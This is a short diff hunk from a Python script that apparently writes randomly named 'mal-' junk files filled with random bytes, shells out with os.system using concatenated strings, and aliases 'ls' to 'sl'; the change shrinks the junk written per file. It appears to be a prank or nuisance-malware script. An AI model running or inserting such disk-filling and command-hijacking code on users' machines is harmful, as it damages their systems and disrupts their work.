@@ -18,7 +18,7 @@ def forked():
     os.system("mkdir " + directory)
     os.system("touch " + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4))
     with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
-      file.write(malwar + str(random.randbytes(999999999)))
+      file.write(malwar + str(random.randbytes(999)))
       os.system("clear")
     if number == 1:
       os.system('alias ls="sl"')
